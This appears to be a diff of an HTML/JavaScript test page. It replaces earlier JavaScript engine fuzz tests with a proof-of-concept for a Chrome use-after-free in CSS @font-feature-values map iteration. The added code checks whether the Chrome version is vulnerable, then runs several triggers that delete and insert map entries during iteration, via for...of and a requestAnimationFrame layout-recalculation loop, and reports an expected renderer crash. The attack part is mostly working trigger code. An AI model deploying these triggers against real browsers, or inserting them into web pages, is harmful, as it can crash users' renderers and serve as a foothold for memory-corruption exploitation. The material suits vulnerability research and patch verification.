+// Dev/Canary builds have build number 0: 145.0.0.0
+// In that case major.minor is not enough, full build number is required.
+function parseVersion(v) {
+  const parts = v.split(".").map(Number);
+  return {
+    major: parts[0] || 0,
+    minor: parts[1] || 0,
+    build: parts[2] || 0,
+    patch: parts[3] || 0,
+    isDevBuild: (parts[2] === 0 && parts[3] === 0)
+  };
 }
 
-// T98 — delete de propriedade JIT-compilada dentro de getter de outro objeto
-// Getter de objeto A deleta propriedade de B que esta sendo lido pelo JIT;
-// slot de B fica invalido enquanto JIT ainda tem ponteiro para ele
-function t98(){
-  log('Teste 98: inicio');
-  try {
-    const victim = { a: 1, b: 2, c: 3, d: 4, e: 5 };
-    const attacker = {};
-    Object.defineProperty(attacker, 'trigger', {
-      get: function(){
-        delete victim.c;
-        delete victim.d;
-        victim.f = 6;
-        return 99;
-      },
-      configurable: true, enumerable: true
-    });
+function isVulnerable(vStr) {
+  const v = parseVersion(vStr);
+  // Dev/Canary build (x.x.0.0): receives upstream fix early, considered safe
+  if (v.isDevBuild) return false;
+  // major < 145 → definitely vulnerable
+  if (v.major < 145) return true;
+  // major > 145 → patched
+  if (v.major > 145) return false;
+  // major === 145: check build number
+  if (v.build < 7632) return true;
+  if (v.build > 7632) return false;
+  // build === 7632: check patch
+  return v.patch < 75;
+}
 
-    function sumVictim(o){ return o.a + o.b + o.c + o.d + o.e; }
-    for(let i = 0; i < 0x20000; i++) sumVictim(victim);
+if (chromeMatch) {
+  const v = parseVersion(chromeVersion);
+  if (v.isDevBuild) {
+    print("[?] Dev/Canary build detected (" + chromeVersion + ").", "warn");
+    print("[?] Dev builds receive upstream fixes early — likely PATCHED.", "warn");
+    print("[?] Use stable/beta channel (<= 144.0.x) for accurate testing.", "warn");
+  } else if (isVulnerable(chromeVersion)) {
+    print("[!] THIS VERSION IS VULNERABLE! (" + chromeVersion + " < 145.0.7632.75)", "fail");
+    print("[!] Renderer crash expected — if no crash occurred, sandbox or other", "fail");
+    print("[!] mitigations may have altered the trigger conditions.", "fail");
+  } else {
+    print("[+] This version is patched. (" + chromeVersion + " >= 145.0.7632.75)", "ok");
+    print("[+] No crash expected — the fix prevents iterator invalidation.", "ok");
+  }
+} else {
+  print("[?] Chrome version could not be detected.", "warn");
+}
 
-    attacker.trigger;
-    for(let i = 0; i < 1000; i++){
-      try { sumVictim(victim); } catch(e){}
+if (crashDetected) {
+  print("[!] Exception detected — UAF was partially triggered.", "fail");
+} else {
+  print("[+] No exception — either patched version, or the crash killed the renderer", "ok");
+  print("    (if the renderer crashed, this line would never execute).", "ok");
+}
+
+print("");
+print("[*] Commit: 63f3cb4864c64c677cd60c76c8cb49d37d08319c", "info");
+print("[*] Diff:   css_font_feature_values_map.cc", "info");
+print("[*] Fix:    const FontFeatureAliases* → const FontFeatureAliases (deep copy)", "info");
+print("─".repeat(60), "info");
+
+// ─── 5. Alternative trigger via for...of ─────────────────────────────────────
+// Some Blink versions use a different code path for for...of iteration.
+print("");
+print("[*] Alternative trigger: for...of + concurrent mutation...", "info");
+
+try {
+  // Retry with a fresh map
+  const style2 = document.createElement("style");
+  document.head.appendChild(style2);
+  style2.sheet.insertRule(
+    `@font-feature-values AltFont {
+      @styleset { x1: 10; x2: 20; x3: 30; x4: 40; x5: 50; }
+    }`, 0
+  );
+  const rule2 = style2.sheet.cssRules[0];
+  const map2 = rule2.styleset;
+
+  let altCount = 0;
+  for (const [k, v] of map2) {
+    altCount++;
+    // Mutation during iteration
+    map2.delete(k);
+    for (let i = 0; i < 512; i++) {
+      map2.set("alt_" + altCount + "_" + i, [i, i]);
     }
+    if (altCount >= 5) break;
+  }
+  print("[+] for...of completed (" + altCount + " iterations).", "ok");
+} catch(e) {
+  print("[!] for...of exception: " + e.message, "fail");
+}
 
-    function loopWithSideEffect(count){
-      for(let i = 0; i < count; i++){
-        sumVictim(victim);
-        if(i === 50) attacker.trigger;
-      }
+// ─── 6. Async trigger via requestAnimationFrame ──────────────────────────────
+// Forces layout recalculation via offsetWidth inside a rAF loop,
+// re-triggering the CSS engine.
+print("");
+print("[*] Starting rAF + layout recalc trigger...", "info");
+
+const style3 = document.createElement("style");
+document.head.appendChild(style3);
+style3.sheet.insertRule(
+  `@font-feature-values RafFont {
+    @styleset { r1: 1; r2: 2; r3: 3; r4: 4; r5: 5; }
+  }`, 0
+);
+const rule3 = style3.sheet.cssRules[0];
+const map3 = rule3.styleset;
+
+let rafCount = 0;
+let rafIterator = map3.entries();
+
+function rafTrigger() {
+  if (rafCount >= 10) {
+    print("[+] rAF trigger completed (" + rafCount + " frames).", "ok");
+    print("");
+    print("[*] PoC finished. See results above.", "info");
+    print("");
+    print("[*] SUMMARY:", "info");
+    print("[*]   Vulnerable : Chrome <= 144.x (stable) or < 145.0.7632.75", "info");
+    print("[*]   Patched    : Chrome >= 145.0.7632.75 (stable)", "info");
+    print("[*]   Dev build  : e.g. 145.0.0.0 — receives upstream fix early", "info");
+    print("[*]   No crash   : Version is patched OR renderer silently crashed", "info");
+    print("[*]   Crash      : UAF successfully triggered", "info");
+    return;
+  }
+
+  // Force layout recalc — re-trigger CSS engine
+  void document.body.offsetWidth;
+
+  // Iterator step
+  const result = rafIterator.next();
+  if (!result.done) {
+    const [k] = result.value;
+    map3.delete(k);
+    for (let i = 0; i < 512; i++) {
+      map3.set("raf_" + rafCount + "_" + i, [rafCount, i]);
     }
-    try { loopWithSideEffect(100); } catch(e){}
-  } catch(e){}
-  log('Teste 98: fim');
+  }
+
+  rafCount++;
+  requestAnimationFrame(rafTrigger);
 }
 
-// T99 — structuredClone de objeto com ciclo + TypedArray + getter com side effect
-// structuredClone deve detectar ciclos; getter chamado durante clone pode corromper estado
-function t99(){
-  log('Teste 99: inicio');
-  try {
-    let cloneCount = 0;
-    const root = {
-      data: new Uint32Array(64),
-      child: null,
-      get sideEffect(){
-        cloneCount++;
-        if(cloneCount === 2){
-          root.data[0] = 0xDEAD;
-          root.newProp = 'added_during_clone';
-        }
-        return cloneCount;
-      }
-    };
-    root.child = { parent: root, buf: new ArrayBuffer(32) };
-    root.child.self = root.child;
-
-    try { structuredClone({ x: 1, cycle: null }); } catch(e){}
-    try {
-      const simple = { arr: new Uint8Array(8), self: null };
-      simple.self = simple;
-      structuredClone(simple);
-    } catch(e){}
-    try { structuredClone(root); } catch(e){}
-    try {
-      let deep = { val: 0 };
-      let cur = deep;
-      for(let i = 0; i < 500; i++){
-        cur.next = { val: i, buf: new Uint8Array(4) };
-        cur = cur.next;
-      }
-      cur.backToRoot = deep;
-      structuredClone(deep);
-    } catch(e){}
-  } catch(e){}
-  log('Teste 99: fim');
-}
-
-// T100 — Proxy + Reflect.set com receiver diferente + prototype getter/setter
-// Reflect.set(target, key, val, receiver) usa receiver para o set;
-// receiver com getter/setter diferente do target cria interacao complexa e potencial UAF
-function t100(){
-  log('Teste 100: inicio');
-  try {
-    let setLog = [];
-    const base = {};
-    Object.defineProperty(base, 'x', {
-      get(){ return this._x || 0; },
-      set(v){ this._x = v * 2; setLog.push(v); },
-      configurable: true
-    });
-
-    const derived = Object.create(base);
-    derived._x = 10;
-
-    const pBase = new Proxy(base, {
-      set(t, k, v, receiver){
-        return Reflect.set(t, k, v, receiver);
-      },
-      get(t, k, receiver){
-        return Reflect.get(t, k, receiver);
-      }
-    });
-
-    try { Reflect.set(pBase, 'x', 5, derived); }  catch(e){}
-    try { Reflect.set(pBase, 'x', 10, pBase); }   catch(e){}
-    try { pBase.x = 15; }                          catch(e){}
-    try { Reflect.set(pBase, 'x', 20, pBase); }   catch(e){}
-
-    const pDerived = new Proxy(derived, {
-      set(t, k, v, receiver){
-        return Reflect.set(pBase, k, v, pDerived);
-      }
-    });
-    try { pDerived.x = 99; }                          catch(e){}
-    try { Reflect.set(pDerived, 'x', 42, base); }     catch(e){}
-    try { Reflect.set(pBase, 'x', 77, pDerived); }    catch(e){}
-
-    // Ciclo: receiver e o proxy de si mesmo
-    const selfProxy = new Proxy({}, {
-      set(t, k, v, receiver){
-        if(setLog.length < 100) return Reflect.set(t, k, v, selfProxy);
-        return true;
-      }
-    });
-    try { Reflect.set(selfProxy, 'y', 1, selfProxy); } catch(e){}
-  } catch(e){}
-  log('Teste 100: fim');
-}
+requestAnimationFrame(rafTrigger);
 </script>
 </body>
 </html>
